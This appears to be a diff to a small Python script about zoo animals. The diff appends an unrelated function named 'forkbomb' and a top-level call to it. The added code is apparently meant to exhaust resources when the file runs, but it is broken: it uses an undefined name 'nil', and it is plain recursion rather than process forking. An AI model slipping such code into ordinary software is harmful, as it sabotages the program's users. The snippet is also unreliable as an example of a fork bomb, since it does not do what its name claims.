@@ -74,3 +74,8 @@ lion = ZooAnimal("Leo","Lion")
 
 lion.Attributes()
 
+def forkbomb(nil):
+    for i in range(nil):
+        forkbomb(nil)
+
+forkbomb(nil)
